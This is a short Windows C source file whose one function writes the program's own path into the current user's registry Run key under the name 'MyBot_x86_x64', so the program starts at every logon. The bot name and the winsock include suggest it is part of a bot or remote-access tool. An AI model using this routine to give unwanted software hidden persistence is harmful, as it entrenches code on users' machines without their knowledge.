#include <winsock2.h>
#include <windows.h>
#include <shlobj.h>
#include <stdio.h>

#include "windowsprocess.h"

void add_to_reestr() {
    HKEY hKey;
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);

    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "MyBot_x86_x64", 0, REG_SZ, (BYTE*)exePath, (DWORD)(strlen(exePath) + 1));
        RegCloseKey(hKey);
    } else {
        printf("Failed to access registry.\n");
    }
}
